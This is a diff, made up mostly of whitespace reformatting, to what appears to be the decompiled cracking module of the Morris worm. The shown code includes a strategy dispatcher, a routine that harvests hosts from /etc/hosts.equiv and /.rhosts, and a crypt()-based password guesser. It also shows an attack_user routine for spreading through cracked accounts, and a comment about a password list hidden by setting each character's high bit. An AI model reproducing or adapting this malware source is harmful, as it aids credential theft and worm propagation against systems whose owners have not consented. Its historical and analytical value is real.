@@ -6,35 +6,37 @@
 
 int cmode;
 extern struct hst *h_name2host();
-struct usr{					/* sizeof(usr) == 58 */
+struct usr{				 /* sizeof(usr) == 58 */
   char *name,*o4,*o8,*o12;
-  char passwd[14];				/* offset 16 */
-  char decoded_passwd[14];			/* 30 */
+  char passwd[14];				 /* offset 16 */
+  char decoded_passwd[14]; /* 30 */
   short pad;
-  char *homedir;				/* offset 46 */
+  char *homedir;			/* offset 46 */
   char *gecos;				/* offset 50 */
-  struct usr *next;				/* offset 54 */
+  struct usr *next;		/* offset 54 */
 };
 /* Ahhh, I just love these names.  Don't change them for anything. */
 static struct usr *x27f28,*x27f2c;
+
 /* Crack some passwords. */
 cracksome()
 {
   switch(cmode){
   case 0:
-	strat_0();
-	return;					/* 88 */
+    strat_0();
+    return;	 /* 88 */
   case 1:
-	strat_1();
-	return;
+    strat_1();
+    return;
   case 2:
-	try_words();
-	return;
+    try_words();
+    return;
   case 3:
-	dict_words();
-	return;
+    dict_words();
+    return;
   }
 }
+
 /* Strategy 0, look through /etc/hosts.equiv, and /.rhost for new hosts */
 strat_0()					/* 0x5da4 */
 {
@@ -169,7 +171,7 @@ static strat_1()				/* 0x61ca */
 }
 
 static reverse_str(str1, str2)			/* x642a */
-     char *str1,*str2;
+char *str1,*str2;
 {
   int length,i;
   length=strlen(str1);
@@ -181,8 +183,8 @@ static reverse_str(str1, str2)			/* x642a */
 }
 
 static try_passwd(user, str)			/* 0x6484, unchecked */
-     struct usr *user;
-     char *str;
+struct usr *user;
+char *str;
 {
   if (strcmp(user->passwd,crypt(str,user->passwd))==0 ||
       (str[0]=='\0' && user->passwd=='\0')) {
@@ -198,7 +200,7 @@ static try_passwd(user, str)			/* 0x6484, unchecked */
  */
 /* This is only called from try_passwd() */
 static attack_user(user)			/* 0x6514 */
-     struct usr *user;
+struct usr *user;
 {
   FILE *fwd_fp;
   char buf[512],*hostpart;			/* l516 */
@@ -244,6 +246,7 @@ static attack_user(user)			/* 0x6514 */
   }
   return;
 }
+
 /* This array in the sun binary was camaflouged by having the
    high-order bit set in every char. */
 char *wds[] = 					/* 0x21a74 */
@@ -357,6 +360,7 @@ char *wds[] = 					/* 0x21a74 */
 	0
 };
 int nextw=0;  /* 0x24868 */
+
 /* Try a list of potential passwds for each user. */
 static try_words()  /* 0x66da */
 {
@@ -367,8 +371,7 @@ static try_words()  /* 0x66da */
     return;	/* 2724 */
   }
   if (nextw==0) {	/* 2550 */
-	  for (i=0; wds[i]; i++)
-	    ;
+	  for (i=0; wds[i]; i++);
 	  permute(wds,i,sizeof(wds[0]));
   }
   for (j=0; wds[nextw][j]!='\0'; j++)
@@ -380,6 +383,7 @@ static try_words()  /* 0x66da */
   nextw+=1;
   return;
 }
+
 /* Called only from the cracksome() dispatch loop. Tries a single word from the
  * dictionary, downcasing if capitalized and trying again. */
 static dict_words()	/* 0x67f0 */
